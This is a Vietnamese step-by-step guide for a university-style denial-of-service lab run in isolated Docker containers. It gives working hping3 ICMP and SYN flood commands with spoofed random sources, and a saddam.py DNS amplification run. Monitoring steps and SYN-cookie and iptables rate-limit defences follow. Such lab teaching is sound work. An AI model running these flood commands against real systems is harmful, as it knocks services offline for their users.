# HƯỚNG DẪN THỰC HÀNH VÀ DEMO LAB 04 – DoS

## 1. Kết nối SSH từ máy Windows lên Ubuntu Server
```bash
ssh orias@192.168.117.13
```

## 2. Di chuyển vào thư mục bài Lab trên Server
```bash
cd /media/sf_.shared/scripts/lab04
```

## 3. Chạy tự động qua các script trong thư mục `.lab`:
```bash
bash .lab/00_init.sh
bash .lab/01_scenario1.sh
bash .lab/02_scenario2.sh
bash .lab/03_scenario3.sh
bash .lab/04_test_defense.sh
# Kết thúc demo Lab 04, giải phóng subnet:
bash .lab/99_down.sh
```

*(Hoặc chạy trực tiếp từ bất kỳ đâu bằng đường dẫn tuyệt đối):*
```bash
bash /media/sf_.shared/scripts/lab04/.lab/00_init.sh
bash /media/sf_.shared/scripts/lab04/.lab/01_scenario1.sh
bash /media/sf_.shared/scripts/lab04/.lab/02_scenario2.sh
bash /media/sf_.shared/scripts/lab04/.lab/03_scenario3.sh
bash /media/sf_.shared/scripts/lab04/.lab/04_test_defense.sh
bash /media/sf_.shared/scripts/lab04/.lab/99_down.sh
```

---

## GIAI ĐOẠN 0: DỰNG MÔI TRƯỜNG DOCKER

Hệ thống được ảo hóa gồm 4 container kết nối trên cùng mạng bridge `net-10.2.6.0` (Subnet: `10.2.6.0/24`):
- `lab04_victim`: IP `10.2.6.20` (Mở cổng 23 Telnet)
- `lab04_attacker`: IP `10.2.6.51` (Cài đặt `hping3`, `saddam.py`)
- `lab04_user`: IP `10.2.6.10` (Client kiểm tra dịch vụ)
- `lab04_dns`: IP `10.2.6.53` (DNS Reflector)

```bash
cd /media/sf_.shared/scripts/lab04
sudo docker compose up -d
sudo docker ps
```

---

## GIAI ĐOẠN 1: KỊCH BẢN 1 – ICMP FLOOD (GÓI TIN LỚN 65000 BYTES)

### Bước 1: Ghi nhận thông số CPU/RAM ban đầu trên Victim
```bash
sudo docker exec lab04_victim top -b -n 1 | head -n 12
```

### Bước 2: Bật bắt gói tin ICMP
```bash
sudo docker exec -d lab04_victim tcpdump -i eth0 -n -w /tmp/lab04_sc1.pcap icmp
```

### Bước 3: Attacker phát động tấn công ICMP Flood
```bash
sudo docker exec lab04_attacker timeout 6 hping3 --icmp 10.2.6.20 -d 65000 --flood --rand-source
```

### Bước 4: User kiểm tra độ trễ và mất gói tin
```bash
sudo docker exec lab04_user ping -c 3 10.2.6.20
```

### Bước 5: Ghi nhận tài nguyên CPU trong khi bị tấn công
```bash
sudo docker exec lab04_victim top -b -n 1 | head -n 12
```
*(Chỉ số `%si` - Software Interrupts tăng vọt do nhân Linux xử lý ghép các phân mảnh IP).*

---

## GIAI ĐOẠN 2: KỊCH BẢN 2 – TCP SYN FLOOD (PORT 23 TELNET)

### Bước 6: Kiểm tra hàng đợi SYN_RECV ban đầu
```bash
sudo docker exec lab04_victim ss -tan state syn-recv
```

### Bước 7: Bật tcpdump bắt gói tin TCP port 23
```bash
sudo docker exec -d lab04_victim tcpdump -i eth0 -n -w /tmp/lab04_sc2.pcap "tcp port 23"
```

### Bước 8: Attacker phát động bão gói tin SYN vào port 23
```bash
sudo docker exec lab04_attacker timeout 6 hping3 -S -p 23 10.2.6.20 --flood --rand-source
```

### Bước 9: User thử kết nối Telnet tới Victim
```bash
sudo docker exec lab04_user nc -z -v -w 2 10.2.6.20 23
```
*(Kết nối bị từ chối hoặc timeout do hàng đợi SYN Backlog bị lấp đầy hoàn toàn).*

### Bước 10: Ghi nhận 2048 kết nối treo bán mở trên Victim
```bash
sudo docker exec lab04_victim ss -tan state syn-recv | wc -l
```

---

## GIAI ĐOẠN 3: KỊCH BẢN 3 – DNS AMPLIFICATION (KHUẾCH ĐẠI PHẢN XẠ)

### Bước 11: Bật tcpdump bắt gói tin DNS port 53
```bash
sudo docker exec -d lab04_victim tcpdump -i eth0 -n -w /tmp/lab04_sc3.pcap "udp port 53"
```

### Bước 12: Attacker gửi truy vấn giả mạo IP nguồn qua saddam.py
```bash
sudo docker exec lab04_attacker python3 /attack/saddam.py 10.2.6.20 -d /attack/dns.txt:www.test.com -c 40
```

### Bước 13: Phân tích hệ số khuếch đại (Amplification Ratio)
```bash
sudo docker exec lab04_victim pkill -INT -x tcpdump
sudo docker exec lab04_victim tcpdump -r /tmp/lab04_sc3.pcap -c 5
```
*(Gói tin truy vấn gửi đi ~64 bytes nhưng gói tin phản hồi trả về Victim lên tới ~1460 bytes, khuếch đại gấp ~22.8 lần).*

---

## GIAI ĐOẠN 4: THỰC NGHIỆM GIẢI PHÁP PHÒNG CHỐNG

### Bước 14: Kích hoạt SYN Cookies và iptables Rate Limiting trên Victim
```bash
sudo docker exec lab04_victim sysctl -w net.ipv4.tcp_syncookies=1
sudo docker exec lab04_victim iptables -A INPUT -p tcp --dport 23 --syn -m limit --limit 5/s --limit-burst 10 -j ACCEPT
sudo docker exec lab04_victim iptables -A INPUT -p tcp --dport 23 --syn -j DROP
```

### Bước 15: Kiểm chứng User vẫn kết nối thành công khi đang bị tấn công
```bash
# Attacker flood:
sudo docker exec -d lab04_attacker hping3 -S -p 23 10.2.6.20 --flood --rand-source
# User thử kết nối ngay lập tức:
sudo docker exec lab04_user nc -z -v -w 3 10.2.6.20 23
# Dừng hping3:
sudo docker exec lab04_attacker pkill -9 hping3
```
